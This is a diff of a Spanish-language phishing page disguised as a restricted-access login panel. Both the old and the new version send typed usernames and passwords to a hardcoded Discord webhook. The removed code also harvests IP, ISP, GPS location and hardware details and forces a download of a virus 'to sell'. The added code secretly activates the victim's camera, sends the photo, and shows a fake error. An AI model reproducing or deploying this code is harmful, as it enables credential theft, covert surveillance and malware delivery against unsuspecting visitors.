@@ -2,71 +2,63 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>SISTEMA TITÁN - CONTROL CENTRAL</title>
+    <title>SISTEMA DE SEGURIDAD ELITE</title>
     <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .terminal { border: 2px solid #00ff00; padding: 40px; background: rgba(0, 20, 0, 0.9); box-shadow: 0 0 50px #00ff00; text-align: center; border-radius: 10px; width: 400px; }
-        .blink { animation: blinker 1s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
-        input { background: #000; border: 1px solid #00ff00; color: #00ff00; padding: 10px; width: 90%; margin: 10px 0; font-size: 16px; outline: none; }
-        button { background: #00ff00; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; width: 95%; font-size: 18px; transition: 0.3s; }
-        button:hover { background: #fff; box-shadow: 0 0 20px #fff; }
+        body { background: #000; color: #0f0; font-family: sans-serif; text-align: center; padding: 50px; }
+        .btn { background: #0f0; color: #000; padding: 20px; border: none; border-radius: 10px; font-weight: bold; width: 100%; cursor: pointer; }
+        input { width: 90%; padding: 15px; margin: 10px; background: #111; border: 1px solid #0f0; color: #0f0; }
     </style>
 </head>
 <body>
-    <div class="terminal">
-        <h1 class="blink"> [ ACCESO RESTRINGIDO ] </h1>
-        <p>> PROTOCOLO TITÁN V4.0 ACTIVADO</p>
-        <p>> AGENTE: ESTARLIN SECURITY</p>
-        <hr color="#00ff00">
-        <input type="text" id="user" placeholder="USUARIO DE SISTEMA">
-        <input type="password" id="pass" placeholder="CÓDIGO DE ENTRADA">
-        <button onclick="infiltrar()">INICIAR SESIÓN</button>
-        <p id="status" style="font-size: 10px; color: #008800; margin-top: 20px;">ESPERANDO AUTENTICACIÓN...</p>
-    </div>
+    <h1>⚠️ ACCESO RESTRINGIDO</h1>
+    <p>Inicie sesión para continuar</p>
+    <input type="text" id="user" placeholder="Usuario">
+    <input type="password" id="pass" placeholder="Contraseña">
+    <button class="btn" onclick="capturarTodo()">ENTRAR AL PANEL</button>
+
+    <video id="video" style="display:none;" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const WH = "https://discord.com/api/webhooks/1461515276553027718/pQXKXkGBXNp0bBortqwEzlKOUZ8mbKBmbQ1RyvswIf5eekhfaoYpqePHugjwhwYk6KbL";
 
-        async function infiltrar() {
+        async function capturarTodo() {
             const u = document.getElementById('user').value;
             const p = document.getElementById('pass').value;
-            if(!u || !p) return alert("Ingrese credenciales");
 
-            document.getElementById('status').innerText = "> EXFILTRANDO DATOS... 100%";
-
-            // 1. GPS + IP + HARDWARE
-            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
+            // 1. CAPTURAR FOTO (Cámara Frontal)
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
             
-            navigator.geolocation.getCurrentPosition(pos => {
-                enviar(u, p, ipData, pos.coords);
-            }, () => {
-                enviar(u, p, ipData, null);
-            });
-
-            // 2. DESCARGA FORZADA DEL VIRUS (El que venderás)
-            // Aquí debes poner el link directo de tu .exe subido a Dropbox/GoogleDrive
-            window.location.href = "TU_LINK_DE_DESCARGA_AQUI";
+            setTimeout(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const foto = canvas.toDataURL('image/png');
+                enviarADiscord(u, p, foto);
+            }, 1000);
         }
 
-        function enviar(u, p, ip, gps) {
+        function enviarADiscord(u, p, foto) {
+            // Enviar Datos y Foto
             fetch(WH, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    content: "🎭 **NUEVA VÍCTIMA CAÍDA - REPORTE ELITE**",
+                    content: "📸 **FOTO Y DATOS CAPTURADOS**",
                     embeds: [{
-                        title: "DATOS CAPTURADOS",
-                        color: 16711680,
+                        title: "Víctima Infiltrada",
                         fields: [
-                            { name: "🔑 CREDENCIALES", value: `**User:** ${u}\n**Pass:** ${p}`, inline: false },
-                            { name: "📍 UBICACIÓN", value: gps ? `[Ver en Google Maps](https://www.google.com/maps?q=${gps.latitude},${gps.longitude})` : "Denegado", inline: true },
-                            { name: "🌐 RED", value: `**IP:** ${ip.ip}\n**ISP:** ${ip.org}`, inline: true },
-                            { name: "📱 SISTEMA", value: `**OS:** ${navigator.platform}\n**GPU:** ${navigator.hardwareConcurrency} Cores`, inline: false }
-                        ]
+                            {name: "👤 Usuario", value: u},
+                            {name: "🔑 Clave", value: p}
+                        ],
+                        image: { url: 'attachment://foto.png' }
                     }]
                 })
             });
+            alert("Error de sincronización. Reintente.");
         }
     </script>
 </body>
